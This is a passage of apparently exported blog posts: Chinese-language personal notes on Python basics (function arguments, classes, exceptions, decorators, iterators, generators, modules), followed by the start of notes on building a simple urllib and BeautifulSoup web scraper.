<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">True</span><br><span class="line">True</span><br><span class="line">[1, 2]</span><br><span class="line">0x2bee5c1fc88</span><br><span class="line">0x2bee5c1fc88</span><br><span class="line">False</span><br><span class="line">0x2bee5c1fc88</span><br><span class="line">0x2bee5c2b848</span><br><span class="line">True</span><br><span class="line">False</span><br><span class="line">0x2bee5c1fc88</span><br><span class="line">0x2bee5c2b848</span><br></pre></td></tr></table></figure>

<h4 id="关键字参数和收集参数"><a href="#关键字参数和收集参数" class="headerlink" title="关键字参数和收集参数"></a>关键字参数和收集参数</h4><p>关键字参数的好处就是不需要记住函数中形参的顺序</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">setime</span>(<span class="params">h, m, s=<span class="string">&#x27;unknown&#x27;</span></span>):</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;time is: &#123;0&#125; hour,&#123;1&#125; minutes,&#123;2&#125; seconds&#x27;</span>.<span class="built_in">format</span>(h, m, s))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">setime(m=<span class="number">20</span>, s=<span class="number">42</span>, h=<span class="number">13</span>)</span><br><span class="line">setime(h=<span class="number">13</span>, m=<span class="number">20</span>)</span><br></pre></td></tr></table></figure>

<p>看一下默认值的效果</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">time is: 13 hour,20 minutes,42 seconds</span><br><span class="line">time is: 13 hour,20 minutes,unknown seconds</span><br></pre></td></tr></table></figure>

<p>收集参数主要就是* 和 **</p>
<p>用法很简单，要注意几点：*返回元组，**返回字典，且**要定义在*之后</p>
<h4 id="一些新的函数"><a href="#一些新的函数" class="headerlink" title="一些新的函数"></a>一些新的函数</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="built_in">map</span>.__doc__+<span class="string">&#x27;\n~~~~~~~~&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">sum</span>.__doc__+<span class="string">&#x27;\n~~~~~~~~&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">filter</span>.__doc__+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># etc</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">is_odd</span>(<span class="params">n</span>):</span></span><br><span class="line">    <span class="keyword">return</span> n % <span class="number">2</span> == <span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">tmplist = <span class="built_in">filter</span>(is_odd, [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">10</span>])</span><br><span class="line">newlist = <span class="built_in">list</span>(tmplist)</span><br><span class="line"><span class="built_in">print</span>(newlist)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;\n~~~~~~~~&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p> 结果如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">map(func, *iterables) --&gt; map object</span><br><span class="line"></span><br><span class="line">Make an iterator that computes the function using arguments from</span><br><span class="line">each of the iterables.  Stops when the shortest iterable is exhausted.</span><br><span class="line">~~~~~~~~</span><br><span class="line">Return the sum of a &#x27;start&#x27; value (default: 0) plus an iterable of numbers</span><br><span class="line"></span><br><span class="line">When the iterable is empty, return the start value.</span><br><span class="line">This function is intended specifically for use with numeric values and may</span><br><span class="line">reject non-numeric types.</span><br><span class="line">~~~~~~~~</span><br><span class="line">filter(function or None, iterable) --&gt; filter object</span><br><span class="line"></span><br><span class="line">Return an iterator yielding those items of iterable for which function(item)</span><br><span class="line">is true. If function is None, return the items that are true.</span><br><span class="line"></span><br><span class="line">[1, 3, 5, 7, 9]</span><br><span class="line"></span><br><span class="line">~~~~~~~~</span><br></pre></td></tr></table></figure>

<h2 id="7-更加抽象"><a href="#7-更加抽象" class="headerlink" title="7 更加抽象"></a>7 更加抽象</h2><p>关键就是对象吧，主要概念就是多态，封装，继承</p>
<h4 id="class"><a href="#class" class="headerlink" title="class"></a>class</h4><p>直接记录一下class的一些花招</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Fruit</span>(<span class="params"><span class="built_in">object</span></span>):</span></span><br><span class="line">    __name = <span class="string">&#x27;fruit&#x27;</span>  <span class="comment"># private</span></span><br><span class="line">    taste = <span class="string">&#x27;sweet&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">getname</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;name is: &#123;0&#125;&#x27;</span>.<span class="built_in">format</span>(self.__name))</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">getaste</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;taste is: &#123;0&#125;&#x27;</span>.<span class="built_in">format</span>(self.taste))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">fruit = Fruit()</span><br><span class="line"><span class="built_in">print</span>(fruit._Fruit__name)  <span class="comment"># 强行调用私有特性，但是import的时候，不会导入_Fruit</span></span><br><span class="line">fruit.getname()  <span class="comment"># 正常通过公有方法调用</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Mango</span>(<span class="params">Fruit</span>):</span></span><br><span class="line">    taste = <span class="string">&#x27;very sweet&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">mango = Mango()</span><br><span class="line">mango.getaste()  <span class="comment"># 超类，继承了父类的方法</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Watermelon</span>(<span class="params">Mango, Fruit</span>):</span></span><br><span class="line">    __name = <span class="string">&#x27;watermelon&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">watermelon = Watermelon()</span><br><span class="line">watermelon.getname()  <span class="comment"># 私有特性无法覆盖和继承，永远为最高父类</span></span><br><span class="line">watermelon.getaste()  <span class="comment"># 多个超类，继承不同的类，若类有包含关系，选择子类</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">issubclass</span>(Watermelon, Mango))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">issubclass</span>(Watermelon, Fruit))  <span class="comment"># 判断是否为子类</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">isinstance</span>(watermelon, Watermelon))  <span class="comment"># 判断是否为该类实例，不推荐这么用，可以用如下方法</span></span><br><span class="line"><span class="built_in">print</span>(watermelon.__class__)  <span class="comment"># 知道该对象属于哪个类</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hasattr</span>(Watermelon, <span class="string">&#x27;getaste&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hasattr</span>(Watermelon, <span class="string">&#x27;__name&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hasattr</span>(watermelon.getaste, <span class="string">&#x27;__call__&#x27;</span>))  <span class="comment"># 查看是否可以调用这个方法</span></span><br><span class="line"><span class="built_in">print</span>(mango.__dict__)  <span class="comment"># 实例查看不了</span></span><br><span class="line"><span class="built_in">print</span>(Mango.__dict__)  <span class="comment"># 查看对象所有特性</span></span><br><span class="line"><span class="built_in">setattr</span>(mango, <span class="string">&#x27;taste&#x27;</span>, <span class="string">&#x27;sour&#x27;</span>)  <span class="comment"># 修改特性，获取的方法是getattr</span></span><br><span class="line"><span class="built_in">print</span>(mango.taste)</span><br><span class="line"><span class="built_in">print</span>(watermelon.taste)  <span class="comment"># 父类特性修改后，子类特性不变</span></span><br></pre></td></tr></table></figure>

<p>配上输出的结果一目了然</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">fruit</span><br><span class="line">name is: fruit</span><br><span class="line">taste is: very sweet</span><br><span class="line">name is: fruit</span><br><span class="line">taste is: very sweet</span><br><span class="line">True</span><br><span class="line">True</span><br><span class="line">True</span><br><span class="line">&lt;class &#x27;__main__.Watermelon&#x27;&gt;</span><br><span class="line">True</span><br><span class="line">False</span><br><span class="line">True</span><br><span class="line">&#123;&#125;</span><br><span class="line">&#123;&#x27;__doc__&#x27;: None, &#x27;taste&#x27;: &#x27;very sweet&#x27;, &#x27;__module__&#x27;: &#x27;__main__&#x27;&#125;</span><br><span class="line">sour</span><br><span class="line">very sweet</span><br></pre></td></tr></table></figure>

<h2 id="异常"><a href="#异常" class="headerlink" title="异常"></a>异常</h2><p>每个异常都是一些类，常用的的异常类我觉得等以后写了bug查一下就知道了</p>
<p>一个简单的捕获异常的例子，源自书本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Calculator</span>(<span class="params"><span class="built_in">object</span></span>):</span></span><br><span class="line">    muffled = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">calc</span>(<span class="params">self, expr</span>):</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">eval</span>(expr)</span><br><span class="line">        <span class="keyword">except</span> ZeroDivisionError:</span><br><span class="line">            <span class="keyword">if</span> self.muffled:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;Division bey zero is illegal&#x27;</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">raise</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">calculator = Calculator()</span><br><span class="line">calculator.calc(<span class="string">&#x27;10/0&#x27;</span>)</span><br><span class="line">calculator.muffled = <span class="literal">False</span></span><br><span class="line">calculator.calc(<span class="string">&#x27;10/0&#x27;</span>)</span><br><span class="line">calculator.muffled = <span class="literal">True</span></span><br><span class="line">calculator.calc(<span class="string">&#x27;10/0&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>看一下结果就好了，异常不捕获的话会卡死后面</p>
<p>我们可以选择捕获以后不释放错误，就不会卡死如下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Calculator</span>(<span class="params"><span class="built_in">object</span></span>):</span></span><br><span class="line">    muffled = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">calc</span>(<span class="params">self, expr</span>):</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">eval</span>(expr)</span><br><span class="line">        <span class="keyword">except</span> (ZeroDivisionError, TypeError) <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">if</span> self.muffled:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;Division bey zero is illegal&#x27;</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span>(e)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">calculator = Calculator()</span><br><span class="line">calculator.calc(<span class="string">&#x27;10/0&#x27;</span>)</span><br><span class="line">calculator.muffled = <span class="literal">False</span></span><br><span class="line">calculator.calc(<span class="string">&#x27;10/0&#x27;</span>)</span><br><span class="line">calculator.muffled = <span class="literal">True</span></span><br><span class="line">calculator.calc(<span class="string">&#x27;10/0&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>多个错误的时候一定记得加()，然后有个常用的finally，自己这里没写，提一下怕自己忘记，是最后百分之百执行的，配合try使用</p>
<h2 id="9-魔法方法、属性和迭代器"><a href="#9-魔法方法、属性和迭代器" class="headerlink" title="9 魔法方法、属性和迭代器"></a>9 魔法方法、属性和迭代器</h2><p>这章节的标题很玄乎就是了</p>
<h4 id="init"><a href="#init" class="headerlink" title="__init__"></a>__init__</h4><p>构造__init__其实还挺普遍的，但是有几个坑自己要注意，例子有些就直接用书上的了，自己稍微改了改</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Bird</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.hungry = <span class="literal">True</span></span><br><span class="line">        self.name = <span class="string">&#x27;gugu&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">eat</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">if</span> self.hungry:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">            self.hungry = <span class="literal">False</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;No, thanks&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SongBird</span>(<span class="params">Bird</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="built_in">super</span>().__init__()  <span class="comment"># 重写构造函数一定要super，不然继承不了父类构造的属性</span></span><br><span class="line">        self.sound = <span class="string">&#x27;Squawk&#x27;</span></span><br><span class="line">        self.name = <span class="string">&#x27;gugugu&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">sing</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="built_in">print</span>(self.sound)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">getname</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;name is: &#123;0&#125;&#x27;</span>.<span class="built_in">format</span>(self.name))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sbb = Bird()</span><br><span class="line">sbb.eat()</span><br><span class="line">sb = SongBird()</span><br><span class="line">sb.sing()</span><br><span class="line">sb.eat()</span><br><span class="line">sb.eat()</span><br><span class="line">sb.getname()</span><br></pre></td></tr></table></figure>

<h4 id="setattr-和-getattr"><a href="#setattr-和-getattr" class="headerlink" title="__setattr__和__getattr__"></a>__setattr__和__getattr__</h4><p>主要是为了偷懒，不用写一大堆get或者set了，当然如果是private的特性另当别论了</p>
<p>如果对象没有该特性，则会调用__getattr__，至于__getattr__可以单纯的偷懒了</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Bird</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.hungry = <span class="literal">True</span></span><br><span class="line">        self.name = <span class="string">&#x27;gugu&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">eat</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">if</span> self.hungry:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">            self.hungry = <span class="literal">False</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;No, thanks&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SongBird</span>(<span class="params">Bird</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="built_in">super</span>().__init__()  <span class="comment"># 重写构造函数一定要super，不然继承不了父类构造的属性</span></span><br><span class="line">        self.sound = <span class="string">&#x27;Squawk&#x27;</span></span><br><span class="line">        self.name = <span class="string">&#x27;gugugu&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">sing</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="built_in">print</span>(self.sound)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__setattr__</span>(<span class="params">self, key, value</span>):</span></span><br><span class="line">        <span class="keyword">if</span> key == <span class="string">&#x27;beauty&#x27;</span>:</span><br><span class="line">            self.name = value</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            self.__dict__[key] = value  <span class="comment"># 不是beauty也会调用</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;OK&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__getattr__</span>(<span class="params">self, item</span>):</span></span><br><span class="line">        <span class="keyword">if</span> item == <span class="string">&#x27;food&#x27;</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;food is none&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">raise</span> AttributeError</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sb = SongBird()  <span class="comment"># 4个OK，父类两次，自己本身两次</span></span><br><span class="line"><span class="built_in">print</span>(sb.__dict__)</span><br><span class="line">sb.sing()</span><br><span class="line"><span class="built_in">print</span>(sb.name)</span><br><span class="line"><span class="built_in">print</span>(sb.food)</span><br><span class="line">sb.name = <span class="string">&#x27;gugugugu&#x27;</span></span><br></pre></td></tr></table></figure>

<p>输出如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">OK</span><br><span class="line">OK</span><br><span class="line">OK</span><br><span class="line">OK</span><br><span class="line">&#123;&#x27;hungry&#x27;: True, &#x27;name&#x27;: &#x27;gugugu&#x27;, &#x27;sound&#x27;: &#x27;Squawk&#x27;&#125;</span><br><span class="line">Squawk</span><br><span class="line">gugugu</span><br><span class="line">food is none</span><br><span class="line">None</span><br><span class="line">OK</span><br></pre></td></tr></table></figure>

<h4 id="装饰器"><a href="#装饰器" class="headerlink" title="装饰器"></a>装饰器</h4><p>这个树上一笔带过了，我觉得蛮重要的，就搜了一下</p>
<p>链接：<a href="https://www.cnblogs.com/whyaza/p/9505205.html">https://www.cnblogs.com/whyaza/p/9505205.html</a></p>
<p>理解装饰器的前提**:1.所有东西都是对象(函数可以当做对象传递) 2.闭包**</p>
<p>闭包的概念:<br><strong>1）函数嵌套</strong><br><strong>2）内部函数使用外部函数的变量</strong><br><strong>3）外部函数的返回值为内部函数</strong></p>
<p>我自己通俗的理解就是，比如有三个函数A，B，C</p>
<p>A函数里面有个加工的方法是B，A加工C之后，C不光保留了自身的方法，还获得了B的方法，大概是这样吧</p>
<p>从网上拉下来两个例子</p>
<p>原型</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">showtime</span>(<span class="params">func</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">wrapper</span>():</span></span><br><span class="line">        start_time = time.time()</span><br><span class="line">        func()</span><br><span class="line">        end_time = time.time()</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;spend is &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(end_time - start_time))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> wrapper</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">foo</span>():</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;foo..&#x27;</span>)</span><br><span class="line">    time.sleep(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">foo = showtime(foo)</span><br><span class="line">foo()</span><br></pre></td></tr></table></figure>

<p>语法糖</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">showtime</span>(<span class="params">func</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">wrapper</span>():</span></span><br><span class="line">        start_time = time.time()</span><br><span class="line">        func()</span><br><span class="line">        end_time = time.time()</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;spend is &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(end_time - start_time))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> wrapper</span><br><span class="line"></span><br><span class="line"><span class="meta">@showtime  </span><span class="comment">#foo = showtime(foo)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">foo</span>():</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;foo..&#x27;</span>)</span><br><span class="line">    time.sleep(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">doo</span>():</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;doo..&#x27;</span>)</span><br><span class="line">    time.sleep(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(foo.__name__)  <span class="comment"># wrapper</span></span><br><span class="line"><span class="built_in">print</span>(doo.__name__)  <span class="comment"># doo</span></span><br></pre></td></tr></table></figure>

<p>两种的操作其实是一样的</p>
<h4 id="迭代器"><a href="#迭代器" class="headerlink" title="迭代器"></a>迭代器</h4><p>举个书上例子好了，以我的水平，暂时知道他(__iter__)配合__next__使用就好</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Fibs</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.a = <span class="number">0</span></span><br><span class="line">        self.b = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__next__</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.a, self.b = self.b, self.b + self.a</span><br><span class="line">        <span class="keyword">return</span> self.a</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__iter__</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">return</span> self</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">fibs = Fibs()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> fibs:</span><br><span class="line">    <span class="keyword">if</span> i &gt; <span class="number">1000</span>:</span><br><span class="line">        <span class="built_in">print</span>(i)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<h4 id="生成器"><a href="#生成器" class="headerlink" title="生成器"></a>生成器</h4><p>一个强大的特性，我自己觉得最不可思议的就是冻结，简单的理解的话，有yield就是生成器</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">flatten</span>(<span class="params">nested</span>):</span></span><br><span class="line">    <span class="keyword">for</span> sublist <span class="keyword">in</span> nested:</span><br><span class="line">        <span class="keyword">for</span> element <span class="keyword">in</span> sublist:</span><br><span class="line">            <span class="keyword">yield</span> element</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">nested = [[<span class="number">1</span>, <span class="number">2</span>], [<span class="number">2</span>, <span class="number">4</span>], [<span class="number">5</span>]]</span><br><span class="line"><span class="keyword">for</span> num <span class="keyword">in</span> flatten(nested):</span><br><span class="line">    <span class="built_in">print</span>(num)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">list</span>(flatten(nested)))</span><br></pre></td></tr></table></figure>

<p>运行完你会发现是一个一个输出的</p>
<h2 id="自带电池"><a href="#自带电池" class="headerlink" title="自带电池"></a>自带电池</h2><p>一个看了标题以后完全不知道要学什么的章节</p>
<h4 id="模块"><a href="#模块" class="headerlink" title="模块"></a>模块</h4><p>我们先导入自己做的模块，调用一下，用到了sys</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> sys</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>sys.path.append(<span class="string">&#x27;D:\Study\Python_基础遍程_note&#x27;</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">from</span> 迭代器_生成器 <span class="keyword">import</span> *</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">list</span>(flatten(nested))</span><br><span class="line">[<span class="number">1</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">4</span>, <span class="number">5</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>迭代器_生成器.__name__</span><br><span class="line"><span class="string">&#x27;迭代器_生成器</span></span><br><span class="line"><span class="string">&gt;&gt;&gt; __name__</span></span><br><span class="line"><span class="string">&#x27;</span>__main__<span class="string">&#x27;</span></span><br><span class="line"><span class="string">&gt;&gt;&gt; import pprint</span></span><br><span class="line"><span class="string">&gt;&gt;&gt; pprint.pprint(sys.path)</span></span><br><span class="line"><span class="string">[&#x27;</span><span class="string">&#x27;,</span></span><br><span class="line"><span class="string"> &#x27;</span>C:\\Users\\xxxx\\AppData\\Local\\Programs\\Python\\Python35\\Lib\\idleli<span class="string">b&#x27;,</span></span><br><span class="line"><span class="string"> &#x27;</span>C:\\Users\\xxxx\\AppData\\Local\\Programs\\Python\\Python35\\python35.<span class="built_in">zip</span><span class="string">&#x27;,</span></span><br><span class="line"><span class="string"> &#x27;</span>C:\\Users\\xxxx\\AppData\\Local\\Programs\\Python\\Python35\\DLLs<span class="string">&#x27;,</span></span><br><span class="line"><span class="string"> &#x27;</span>C:\\Users\\xxxx\\AppData\\Local\\Programs\\Python\\Python35\\li<span class="string">b&#x27;,</span></span><br><span class="line"><span class="string"> &#x27;</span>C:\\Users\\xxxx\\AppData\\Local\\Programs\\Python\\Python35<span class="string">&#x27;,</span></span><br><span class="line"><span class="string"> &#x27;</span>C:\\Users\\xxxx\\AppData\\Roaming\\Python\\Python35\\site-packages<span class="string">&#x27;,</span></span><br><span class="line"><span class="string"> &#x27;</span>C:\\Users\\xxxx\\AppData\\Local\\Programs\\Python\\Python35\\lib\\site-packages<span class="string">&#x27;,</span></span><br><span class="line"><span class="string"> &#x27;</span>D:\\Study\\Python_基础遍程_note<span class="string">&#x27;]</span></span><br><span class="line"><span class="string">&gt;&gt;&gt; print(迭代器_生成器.__file__)  # 查看源代码在哪里</span></span><br><span class="line"><span class="string">D:\Study\Python_基础遍程_note\迭代器_生成器.py</span></span><br></pre></td></tr></table></figure>

<p>sys 和 os 模块还是挺管用的，下次遇到了一些问题，可以用这两个模块辅助</p>
<p>就先记录到这里</p>
]]></content>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>Python网络数据采集_note</title>
    <url>/2019/03/03/Python%E7%BD%91%E7%BB%9C%E6%95%B0%E6%8D%AE%E9%87%87%E9%9B%86-note/</url>
    <content><![CDATA[<p>之前用过一点点爬虫方面的技术，想系统得补一下基础，写给自己看的笔记</p>
<span id="more"></span>

<h2 id="创建爬虫"><a href="#创建爬虫" class="headerlink" title="创建爬虫"></a>创建爬虫</h2><p>• 通过网站域名获取 HTML 数据<br>• 根据目标信息解析数据<br>• 存储目标信息<br>• 如果有必要，移动到另一个网页重复这个过程</p>
<h3 id="创建爬虫-1"><a href="#创建爬虫-1" class="headerlink" title="创建爬虫"></a>创建爬虫</h3><h4 id="初见"><a href="#初见" class="headerlink" title="初见"></a>初见</h4><p>这书一开始用的是 urllib.request，我自己比较喜欢request，而且也慢慢都换成这个了吧应该，就结合beautifulsoup随便建立了一个爬虫，但是后来看了一下之后的目录有提到requests库的，就老老实实跟着书的流程走吧</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> urllib.request <span class="keyword">import</span> urlopen</span><br><span class="line"><span class="keyword">from</span> urllib.error <span class="keyword">import</span> HTTPError</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getTitle</span>(<span class="params">url</span>):</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        html = urlopen(url)</span><br><span class="line">    <span class="keyword">except</span> HTTPError <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        bsobj = BeautifulSoup(html.read(), <span class="string">&quot;lxml&quot;</span>)</span><br><span class="line">        title = bsobj.body.h1</span><br><span class="line">    <span class="keyword">except</span> AttributeError <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">    <span class="keyword">return</span> title</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">title = getTitle(<span class="string">&quot;http://www.pythonscraping.com/pages/page1.html&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> title <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Title could not be found&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(title)</span><br></pre></td></tr></table></figure>

<p>其实就多了个lxml用来解析，别的一样，爬虫的最基本雏形</p>
